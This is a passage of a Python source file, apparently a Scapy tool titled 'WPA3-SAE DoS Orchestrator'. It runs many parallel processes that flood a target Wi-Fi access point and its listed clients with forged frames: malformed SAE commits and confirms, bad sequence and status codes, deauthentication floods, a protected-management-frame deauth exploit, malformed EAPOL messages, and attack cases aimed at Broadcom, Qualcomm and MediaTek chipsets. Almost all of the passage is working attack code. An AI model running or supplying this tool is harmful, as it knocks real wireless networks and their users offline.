            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=random.choice([0,1,2,4,5])) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_bad_seq_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_SEQ] {iface}: Bad Seq Generic...")
    try:
        while True:
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst =[RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=random.choice([0,3,4]),status=0)/payload for _ in range(128)]
            send_burst_scientific(burst, iface, cnt)
    except KeyboardInterrupt: pass

def run_bad_status_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[BAD_STATUS] {iface}: Bad Status Generic...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=random.randint(108,200)) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_empty_confirm_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[EMPTY_CONFIRM] {iface}: Empty Confirm Generic...")
    try:
        while True:
            send_burst_scientific([RadioTap()/Dot11(addr1=b,addr2=get_fast_randmac(),addr3=b)/Dot11Auth(algo=3,seqnum=2,status=0) for _ in range(128)], iface, cnt)
    except KeyboardInterrupt: pass

def run_cookie_process(iface, cnt, **kw):
    b, ch = kw.get('bssid'), kw.get('channel')
    if not set_channel_scientific(iface, ch): return
    print(f"[COOKIE] {iface}: Cookie Guzzler (same‑MAC burst)...")
    try:
        while True:
            mac = get_fast_randmac()
            s, f = get_random_sae_bytes(kw['scalar_hex_list'], kw['finite_hex_list'])
            if not s: continue
            payload = Raw(create_sae_payload_bytes(s, f))
            burst =[RadioTap()/Dot11(type=0,subtype=11,addr1=b,addr2=mac,addr3=b)/Dot11Auth(algo=3,seqnum=1,status=0)/payload for _ in range(128)]
            send_burst_scientific(burst, iface, cnt)
            time.sleep(0.5)
    except KeyboardInterrupt: pass

# =====================================================================================
def validate_configuration():
    def valid_b(b): return b and b!="AA:BB:CC:DD:EE:11" and len(b.split(':'))==6
    def has_valid_scalar(lst): return any("INSERT" not in s and len(s) == 64 for s in lst)
    def has_valid_finite(lst): return any("INSERT" not in s and len(s) == 128 for s in lst)
    errs =[]
    if not valid_b(TARGET_BSSID_5GHZ): errs.append("Invalid 5GHz BSSID")
    if not valid_b(TARGET_BSSID_2_4GHZ): errs.append("Invalid 2.4GHz BSSID")
    if not has_valid_scalar(SAE_SCALAR_2_4_HEX_LIST): errs.append("Invalid 2.4GHz Scalar List")
    if not has_valid_finite(SAE_FINITE_2_4_HEX_LIST): errs.append("Invalid 2.4GHz Finite List")
    if not has_valid_scalar(SAE_SCALAR_5_HEX_LIST): errs.append("Invalid 5GHz Scalar List")
    if not has_valid_finite(SAE_FINITE_5_HEX_LIST): errs.append("Invalid 5GHz Finite List")
    if errs:
        print("\n[CRITICAL ERRORS]:\n" + "\n".join(f"  ✗ {e}" for e in errs))
        return False
    print("\n[VALIDATION] Configuration valid")
    return True

def main():
    if os.geteuid() != 0: sys.exit("[ERROR] Run with sudo!")
    config_path = sys.argv[1] if len(sys.argv) > 1 else "config.yaml"
    load_config(config_path)
    print("\n" + "="*80 + "\nWPA3-SAE DoS Orchestrator - CORRECTED EDITION\n" + "="*80)
    if not validate_configuration(): sys.exit(1)
    cleanup({})
    
    manager = Manager()
    shared_channels = manager.dict({'2.4GHz': MANUELLER_KANAL_2_4GHZ, '5GHz': MANUELLER_KANAL_5GHZ})
    channel_lock = Lock()
    
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process, 
                               args=(SCANNER_INTERFACE, 30, 10, shared_channels, channel_lock), 
                               daemon=True)
        scanner_proc.start()
        time.sleep(2)
    
    ap_targets = {'5ghz':{'bssid':TARGET_BSSID_5GHZ,'channel':MANUELLER_KANAL_5GHZ},
                  '2.4ghz':{'bssid':TARGET_BSSID_2_4GHZ,'channel':MANUELLER_KANAL_2_4GHZ}}
    
    ATTACKS = {
        # Vendor Specific
        "case1_denial_of_internet": run_case1_process, "case2_bad_auth_algo_broadcom": run_case2_process,
        "case3_bad_status_code": run_case3_process, "case4_bad_send_confirm": run_case4_process,
        "case5_empty_frame": run_case5_process, "case6_radio_confusion": run_case6_radio_confusion_process,
        "case6_radio_confusion_reverse": run_case6_reverse_process, "case7_back_to_the_future": run_case7_process,
        "case8_bad_auth_algo_qualcomm": run_case8_process, "case9_bad_sequence_number": run_case9_process,
        "case10a_bad_auth_body_empty": run_case10a_process, "case10b_bad_auth_body_payload": run_case10b_process,
        "case11_seq_status_fuzz": run_case11_process, "case12_bursty_auth": run_case12_process,
        "case13_radio_confusion_mediatek": run_case13_process, "case13_radio_confusion_mediatek_reverse": run_case13_reverse_process,
        # Direct / EAPOL
        "deauth_flood": run_deauth_process, "pmf_deauth_exploit": run_pmf_process,
        "malformed_msg1_length": run_malformed_length_process, "malformed_msg1_flags": run_malformed_flags_process,
        # Generic
        "bad_algo": run_bad_algo_process, "bad_seq": run_bad_seq_process, "bad_status_code": run_bad_status_process,
        "empty_frame_confirm": run_empty_confirm_process, "cookie_guzzler": run_cookie_process
    }
    
    procs, counters = {}, {i:Value('i',0) for i in ADAPTER_KONFIGURATION}
    active_channels = {}
    warned_interfaces = set()
    
    print(f"\n[INFO] Starting {len(ADAPTER_KONFIGURATION)} attack processes...")
    print("Press Ctrl+C to stop.\n")
    
    def get_clients_for_attack(attack_name):
        if attack_name in["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
            return TARGET_STA_MACS_5GHZ_SPECIAL
        elif attack_name in["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
            return TARGET_STA_MACS_2_4GHZ_SPECIAL
        elif attack_name in["case2_bad_auth_algo_broadcom", "case8_bad_auth_algo_qualcomm",
                             "case9_bad_sequence_number", "case10a_bad_auth_body_empty",
                             "case10b_bad_auth_body_payload", "case11_seq_status_fuzz",
                             "case12_bursty_auth", "pmf_deauth_exploit", "deauth_flood", "malformed_msg1_length",
                             "malformed_msg1_flags", "case1_denial_of_internet", "case3_bad_status_code",
                             "case4_bad_send_confirm", "case5_empty_frame"]:
            return TARGET_STA_MACS
        else:
            return[]
    
    try:
        while True:
            with channel_lock:
                ap_targets['5ghz']['channel'] = shared_channels.get('5GHz', MANUELLER_KANAL_5GHZ)
                ap_targets['2.4ghz']['channel'] = shared_channels.get('2.4GHz', MANUELLER_KANAL_2_4GHZ)
            
            for iface, cfg in ADAPTER_KONFIGURATION.items():
                attack, band = cfg['angriff'], cfg.get('band', '5GHz')
                if attack not in ATTACKS: continue
                
                ap = ap_targets.get('5ghz' if band=='5GHz' else '2.4ghz')
                if not ap: continue
                
                required_clients = get_clients_for_attack(attack)
                if not required_clients and attack not in["bad_algo", "bad_seq", "bad_status_code", "empty_frame_confirm", "cookie_guzzler"]:
                    if iface not in warned_interfaces:
                        print(f"\n[WARN] {iface}: No target clients specified for '{attack}'. Attack skipped.")
                        warned_interfaces.add(iface)
                    continue

                restart_needed = False
                if iface not in procs or not procs[iface].is_alive():
                    restart_needed = True
                elif active_channels.get(iface) != ap['channel']:
                    restart_needed = True
                
                if restart_needed:
                    if iface in procs:
                        cleanup({iface: procs[iface]})
                    active_channels[iface] = ap['channel']
                    
                    # FIX: Assign SAE lists based on the band we are sending on!
                    if attack in["case6_radio_confusion", "case13_radio_confusion_mediatek_reverse"]:
                        # Sender is on 2.4 GHz, so use 2.4 GHz parameters
                        s_hex, f_hex = SAE_SCALAR_2_4_HEX_LIST, SAE_FINITE_2_4_HEX_LIST
                    elif attack in["case6_radio_confusion_reverse", "case13_radio_confusion_mediatek"]:
                        # Sender is on 5 GHz, so use 5 GHz parameters
                        s_hex, f_hex = SAE_SCALAR_5_HEX_LIST, SAE_FINITE_5_HEX_LIST
                    else:
                        s_hex = SAE_SCALAR_5_HEX_LIST if band=='5GHz' else SAE_SCALAR_2_4_HEX_LIST
                        f_hex = SAE_FINITE_5_HEX_LIST if band=='5GHz' else SAE_FINITE_2_4_HEX_LIST
                    
                    kw = {'bssid': ap['bssid'], 'channel': ap['channel'],
                          'scalar_hex_list': s_hex, 'finite_hex_list': f_hex,
                          'bssid_5ghz': ap_targets['5ghz']['bssid'],
                          'channel_5ghz': ap_targets['5ghz']['channel'],
                          'bssid_2_4ghz': ap_targets['2.4ghz']['bssid'],
                          'channel_2_4ghz': ap_targets['2.4ghz']['channel'],
                          'clients': required_clients}
                    
                    print(f"\n[START] {iface} ({band}): {attack} on CH {ap['channel']} | Target Clients: {len(kw['clients'])}")
                    p = Process(target=ATTACKS[attack], args=(iface, counters[iface]), kwargs=kw)
                    p.start()
                    procs[iface] = p
            
            elapsed = time.time()
            status = " | ".join([f"{i}:{counters[i].value}pkts" for i in procs])
            sys.stdout.write(f"\r[MONITOR] {elapsed:.1f}s | {status}")
            sys.stdout.flush()
            time.sleep(0.5)
            
    except KeyboardInterrupt:
        print("\n[INFO] Stopped by user.")
    finally:
        cleanup(procs)
        if scanner_proc and scanner_proc.is_alive():
            scanner_proc.terminate()
            scanner_proc.join()
        print("\n[INFO] Cleanup complete.")

if __name__ == "__main__":
    main()
